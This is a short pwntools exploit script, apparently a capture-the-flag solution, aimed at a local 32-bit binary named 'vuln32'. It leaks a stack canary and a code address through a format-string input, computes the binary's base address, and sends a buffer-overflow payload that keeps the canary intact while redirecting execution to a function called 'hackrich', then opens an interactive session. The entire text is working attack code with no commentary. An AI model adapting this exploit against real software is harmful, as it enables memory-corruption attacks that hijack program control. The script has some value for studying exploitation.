from pwn import *

p = process('./vuln32')

p.sendline(b'%3$x.%15$x')
leak= str(p.recv())[2:-5]
temp = leak.split('.')

canary = int("0x"+temp[1],16)
base_address = int("0x"+temp[0],16)-0x1204
hackrich = base_address + 0x11cd
payload = b"A"*40 + p32(canary) + b"A"*12 +  p32(hackrich)
p.sendline(payload)
p.interactive()
